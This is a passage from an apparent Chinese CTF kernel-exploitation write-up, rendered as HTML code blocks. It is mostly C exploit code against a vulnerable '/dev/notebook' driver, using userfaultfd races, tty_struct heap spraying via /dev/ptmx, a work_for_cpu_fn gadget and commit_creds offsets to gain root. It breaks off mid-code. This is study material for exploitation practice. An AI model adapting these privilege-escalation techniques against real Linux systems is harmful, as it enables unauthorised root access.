user_sp<span class=\"token punctuation\">;</span>\n    rop_data<span class=\"token punctuation\">[</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> user_ss<span class=\"token punctuation\">;</span>\n\n    <span class=\"token function\">note_write</span><span class=\"token punctuation\">(</span>tty_idx <span class=\"token punctuation\">,</span> tty_buf<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">note_write</span><span class=\"token punctuation\">(</span>fake_tty_op_idx <span class=\"token punctuation\">,</span> buf<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">note_write</span><span class=\"token punctuation\">(</span>rop_idx<span class=\"token punctuation\">,</span> rop<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token comment\">// getchar();</span>\n    <span class=\"token comment\">// 0xffffffff8143f4e1</span>\n\n    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>i<span class=\"token operator\">&lt;</span><span class=\"token number\">0x80</span><span class=\"token punctuation\">;</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span>\n        <span class=\"token function\">write</span><span class=\"token punctuation\">(</span>tty_fd<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token punctuation\">,</span> buf <span class=\"token punctuation\">,</span> <span class=\"token number\">114</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token comment\">// getchar();</span>\n    <span class=\"token comment\">// 可以通过这种方法下断点来查看堆布局 pty_write</span>\n\n<span class=\"token punctuation\">&#125;</span></code></pre>\n<h5 id=\"work_for_cpu_fn-函数利用法\"><a class=\"markdownIt-Anchor\" href=\"#work_for_cpu_fn-函数利用法\">#</a> work_for_cpu_fn 函数利用法</h5>\n<p>此方法就简单很多了</p>\n<pre class=\"language-c\" data-language=\"c\"><code class=\"language-c\"><span class=\"token keyword\">struct</span> <span class=\"token class-name\">work_for_cpu</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">struct</span> <span class=\"token class-name\">work_struct</span> work<span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">long</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">*</span>fn<span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">void</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">void</span> <span class=\"token operator\">*</span>arg<span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">long</span> ret<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">static</span> <span class=\"token keyword\">void</span> <span class=\"token function\">work_for_cpu_fn</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">struct</span> <span class=\"token class-name\">work_struct</span> <span class=\"token operator\">*</span>work<span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">struct</span> <span class=\"token class-name\">work_for_cpu</span> <span class=\"token operator\">*</span>wfc <span class=\"token operator\">=</span> <span class=\"token function\">container_of</span><span class=\"token punctuation\">(</span>work<span class=\"token punctuation\">,</span> <span class=\"token keyword\">struct</span> <span class=\"token class-name\">work_for_cpu</span><span class=\"token punctuation\">,</span> work<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    wfc<span class=\"token operator\">-></span>ret <span class=\"token operator\">=</span> wfc<span class=\"token operator\">-></span><span class=\"token function\">fn</span><span class=\"token punctuation\">(</span>wfc<span class=\"token operator\">-></span>arg<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n</code></pre>\n<p>此函数直接将 rdi+0x20 的地方当成函数执行，将 rdi+0x28 当成第一个参数，将  rdi+0x30 当成返回值，因此可以完成一套很丝滑的函数调用</p>\n<p>userfaultfd + tty_struct-&gt;ioctl + 堆喷 + work_for_cpu_fn</p>\n<pre class=\"language-c\" data-language=\"c\"><code class=\"language-c\"><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdio.h></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;pthread.h></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;unistd.h></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdlib.h></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;sys/ioctl.h></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;sys/types.h></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;sys/stat.h></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;fcntl.h></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;string.h></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;fcntl.h></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;sys/mman.h></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;errno.h></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;signal.h></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;sys/syscall.h></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdint.h></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;sys/prctl.h></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;linux/userfaultfd.h></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;poll.h></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;assert.h></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">\"kernelpwn.h\"</span></span>\n\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token expression\">TTY_STRUCT_SIZE <span class=\"token number\">0x2e0</span></span></span>\n<span class=\"token keyword\">int</span> fd <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>mem<span class=\"token punctuation\">;</span>\n\nsize_t commit_creds <span class=\"token operator\">=</span> <span class=\"token number\">0xa9b40</span><span class=\"token punctuation\">;</span>\nsize_t prepare_kernel_cred <span class=\"token operator\">=</span> <span class=\"token number\">0xa9ef0</span><span class=\"token punctuation\">;</span>\nsize_t work_for_cpu_fn <span class=\"token operator\">=</span> <span class=\"token number\">0x9eb90</span><span class=\"token punctuation\">;</span>\n\n\n\n<span class=\"token keyword\">struct</span> <span class=\"token class-name\">args</span><span class=\"token punctuation\">&#123;</span>\n    size_t index<span class=\"token punctuation\">;</span>\n    size_t size<span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>data<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">typedef</span> args<span class=\"token punctuation\">;</span>\n\n\n<span class=\"token keyword\">void</span> <span class=\"token function\">set_offset</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    commit_creds <span class=\"token operator\">+=</span> vmlinux_base<span class=\"token punctuation\">;</span>\n    prepare_kernel_cred <span class=\"token operator\">+=</span> vmlinux_base<span class=\"token punctuation\">;</span>\n    work_for_cpu_fn <span class=\"token operator\">+=</span> vmlinux_base<span class=\"token punctuation\">;</span>\n\n    <span class=\"token function\">info</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"work_for_cpu_fn\"</span> <span class=\"token punctuation\">,</span> work_for_cpu_fn<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">void</span> <span class=\"token function\">add</span><span class=\"token punctuation\">(</span>size_t index <span class=\"token punctuation\">,</span> size_t size <span class=\"token punctuation\">,</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    args arg<span class=\"token punctuation\">;</span>\n    arg<span class=\"token punctuation\">.</span>index <span class=\"token operator\">=</span> index<span class=\"token punctuation\">;</span>\n    arg<span class=\"token punctuation\">.</span>size <span class=\"token operator\">=</span> size<span class=\"token punctuation\">;</span>\n    arg<span class=\"token punctuation\">.</span>data <span class=\"token operator\">=</span> data<span class=\"token punctuation\">;</span>\n\n    <span class=\"token function\">ioctl</span><span class=\"token punctuation\">(</span>fd <span class=\"token punctuation\">,</span> <span class=\"token number\">0x100</span> <span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>arg <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">void</span> <span class=\"token operator\">*</span> <span class=\"token function\">block_add</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">void</span> <span class=\"token operator\">*</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    args arg<span class=\"token punctuation\">;</span>\n    arg<span class=\"token punctuation\">.</span>index <span class=\"token operator\">=</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>size_t<span class=\"token operator\">*</span><span class=\"token punctuation\">)</span>index<span class=\"token punctuation\">;</span>\n    arg<span class=\"token punctuation\">.</span>size <span class=\"token operator\">=</span> <span class=\"token number\">0x50</span><span class=\"token punctuation\">;</span>\n    arg<span class=\"token punctuation\">.</span>data <span class=\"token operator\">=</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span> mem<span class=\"token punctuation\">;</span>\n\n    <span class=\"token function\">ioctl</span><span class=\"token punctuation\">(</span>fd <span class=\"token punctuation\">,</span> <span class=\"token number\">0x100</span> <span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>arg <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">error</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"error\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">void</span> <span class=\"token operator\">*</span> <span class=\"token function\">block_edit</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">void</span> <span class=\"token operator\">*</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    args arg<span class=\"token punctuation\">;</span>\n    arg<span class=\"token punctuation\">.</span>index <span class=\"token operator\">=</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>size_t<span class=\"token operator\">*</span><span class=\"token punctuation\">)</span>index<span class=\"token punctuation\">;</span>\n    arg<span class=\"token punctuation\">.</span>size <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n    arg<span class=\"token punctuation\">.</span>data <span class=\"token operator\">=</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span> mem<span class=\"token punctuation\">;</span>\n\n    <span class=\"token function\">ioctl</span><span class=\"token punctuation\">(</span>fd <span class=\"token punctuation\">,</span> <span class=\"token number\">0x300</span> <span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>arg <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">error</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"error\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">void</span> <span class=\"token function\">delete</span><span class=\"token punctuation\">(</span>size_t index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    args arg<span class=\"token punctuation\">;</span>\n    arg<span class=\"token punctuation\">.</span>index <span class=\"token operator\">=</span> index<span class=\"token punctuation\">;</span>\n    arg<span class=\"token punctuation\">.</span>size <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n    arg<span class=\"token punctuation\">.</span>data <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">int</span> res <span class=\"token operator\">=</span> <span class=\"token function\">ioctl</span><span class=\"token punctuation\">(</span>fd <span class=\"token punctuation\">,</span> <span class=\"token number\">0x200</span> <span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>arg <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span>res<span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token function\">info</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Detele a chunk\"</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token function\">error</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Can not detele chunk\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">void</span> <span class=\"token function\">edit</span><span class=\"token punctuation\">(</span>size_t index <span class=\"token punctuation\">,</span> size_t size <span class=\"token punctuation\">,</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    args arg<span class=\"token punctuation\">;</span>\n    arg<span class=\"token punctuation\">.</span>index <span class=\"token operator\">=</span> index<span class=\"token punctuation\">;</span>\n    arg<span class=\"token punctuation\">.</span>size <span class=\"token operator\">=</span> size<span class=\"token punctuation\">;</span>\n    arg<span class=\"token punctuation\">.</span>data <span class=\"token operator\">=</span> data<span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">int</span> res <span class=\"token operator\">=</span> <span class=\"token function\">ioctl</span><span class=\"token punctuation\">(</span>fd <span class=\"token punctuation\">,</span> <span class=\"token number\">0x300</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>arg <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">void</span> <span class=\"token function\">leak</span><span class=\"token punctuation\">(</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    args arg<span class=\"token punctuation\">;</span>\n    arg<span class=\"token punctuation\">.</span>index <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n    arg<span class=\"token punctuation\">.</span>size <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n    arg<span class=\"token punctuation\">.</span>data <span class=\"token operator\">=</span> data<span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">int</span> res <span class=\"token operator\">=</span> <span class=\"token function\">ioctl</span><span class=\"token punctuation\">(</span>fd <span class=\"token punctuation\">,</span> <span class=\"token number\">0x64</span> <span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>arg <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">void</span> <span class=\"token function\">note_read</span><span class=\"token punctuation\">(</span>size_t index<span class=\"token punctuation\">,</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>data <span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">int</span> res <span class=\"token operator\">=</span> <span class=\"token function\">read</span><span class=\"token punctuation\">(</span>fd <span class=\"token punctuation\">,</span> data <span class=\"token punctuation\">,</span> index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">void</span> <span class=\"token function\">note_write</span><span class=\"token punctuation\">(</span>size_t index<span class=\"token punctuation\">,</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">int</span> res <span class=\"token operator\">=</span> <span class=\"token function\">write</span><span class=\"token punctuation\">(</span>fd <span class=\"token punctuation\">,</span> data <span class=\"token punctuation\">,</span> index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span>res<span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token function\">info</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Edit chunk data\"</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token function\">error</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Can not Edit chunk data\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n\nsize_t <span class=\"token function\">get_mod_addr</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">&#123;</span>\n    FILE<span class=\"token operator\">*</span> fd <span class=\"token operator\">=</span>  <span class=\"token function\">fopen</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"/tmp/moduleaddr\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"r\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">char</span> buf<span class=\"token punctuation\">[</span><span class=\"token number\">0x100</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">char</span> buffer<span class=\"token punctuation\">[</span><span class=\"token number\">0x100</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    size_t leak <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">fgets</span><span class=\"token punctuation\">(</span>buf<span class=\"token punctuation\">,</span> <span class=\"token number\">0x30</span><span class=\"token punctuation\">,</span> fd<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token function\">sscanf</span><span class=\"token punctuation\">(</span>buf <span class=\"token punctuation\">,</span> <span class=\"token string\">\"%s%s%s%s%s%lx\"</span> <span class=\"token punctuation\">,</span>buffer<span class=\"token punctuation\">,</span>buffer<span class=\"token punctuation\">,</span>buffer<span class=\"token punctuation\">,</span>buffer<span class=\"token punctuation\">,</span>buffer<span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>leak<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">info</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"leak\"</span> <span class=\"token punctuation\">,</span>leak<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">void</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    \n    <span class=\"token keyword\">int</span> tty_fd<span class=\"token punctuation\">[</span><span class=\"token number\">0x100</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span><span class=\"token number\">0</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">int</span> tty_idx <span class=\"token operator\">=</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span> <span class=\"token punctuation\">,</span> fake_tty_op_idx <span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">char</span> buf<span class=\"token punctuation\">[</span><span class=\"token number\">0x1000</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span><span class=\"token number\">0</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">char</span> tty_buf<span class=\"token punctuation\">[</span><span class=\"token number\">0x1000</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span><span class=\"token number\">0</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span>\n\n    size_t <span class=\"token operator\">*</span>data <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>size_t <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span>buf<span class=\"token punctuation\">;</span>\n    size_t <span class=\"token operator\">*</span>tty_data <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>size_t <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span>tty_buf<span class=\"token punctuation\">;</span>\n\n    size_t heap_addr <span class=\"token operator\">=</span> <span class=\"token number\">0</span> <span class=\"token punctuation\">,</span> tty_addr <span class=\"token operator\">=</span> <span class=\"token number\">0</span> <span class=\"token punctuation\">,</span> fake_tty_op_addr <span class=\"token operator\">=</span> <span class=\"token number\">0</span> <span class=\"token punctuation\">,</span>rop_addr <span class=\"token punctuation\">;</span>\n    pthread_t tmp_t<span class=\"token punctuation\">,</span> add_t<span class=\"token punctuation\">,</span> edit_t<span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">long</span> <span class=\"token keyword\">int</span> <span class=\"token operator\">*</span>nums <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">long</span> <span class=\"token keyword\">int</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span> <span class=\"token function\">malloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token operator\">*</span><span class=\"token number\">0x10</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> <span class=\"token number\">0x10</span><span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span>\n        nums<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> i<span class=\"token punctuation\">;</span>\n\n    <span class=\"token function\">save_status</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    fd <span class=\"token operator\">=</span> <span class=\"token function\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"/dev/notebook\"</span> <span class=\"token punctuation\">,</span> O_RDWR<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    mem <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">char</span><span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token function\">mmap</span><span class=\"token punctuation\">(</span><span class=\"token constant\">NULL</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x1000</span><span class=\"token punctuation\">,</span> PROT_READ <span class=\"token operator\">|</span> PROT_WRITE<span class=\"token punctuation\">,</span> MAP_PRIVATE <span class=\"token operator\">|</span> MAP_ANONYMOUS<span class=\"token punctuation\">,</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">register_userfault</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>size_t<span class=\"token punctuation\">)</span> mem <span class=\"token punctuation\">,</span> <span class=\"token number\">0x1000</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">sleep</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>i<span class=\"token operator\">&lt;</span><span class=\"token number\">0x10</span><span class=\"token punctuation\">;</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token function\">add</span><span class=\"token punctuation\">(</span>i <span class=\"token punctuation\">,</span> <span class=\"token number\">0x20</span> <span class=\"token punctuation\">,</span> buf<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token function\">edit</span><span class=\"token punctuation\">(</span>i <span class=\"token punctuation\">,</span> TTY_STRUCT_SIZE <span class=\"token punctuation\">,</span> buf<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> <span class=\"token number\">0x10</span><span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span>\n        <span class=\"token function\">pthread_create</span><span class=\"token punctuation\">(</span> <span class=\"token operator\">&amp;</span>edit_t <span class=\"token punctuation\">,</span> <span class=\"token constant\">NULL</span> <span class=\"token punctuation\">,</span> block_edit <span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">void</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>nums<span class=\"token operator\">+</span>i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token function\">sleep</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> <span class=\"token number\">0x80</span><span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span>\n        tty_fd<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token function\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"/dev/ptmx\"</span><span class=\"token punctuation\">,</span> O_RDWR <span class=\"token operator\">|</span> O_NOCTTY<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> <span class=\"token number\">0x10</span><span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span>\n        <span class=\"token function\">pthread_create</span><span class=\"token punctuation\">(</span> <span class=\"token operator\">&amp;</span>add_t <span class=\"token punctuation\">,</span> <span class=\"token constant\">NULL</span> <span class=\"token punctuation\">,</span> block_add <span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">void</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>nums<span class=\"token operator\">+</span>i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token function\">sleep</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> <span class=\"token number\">0x10</span><span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span 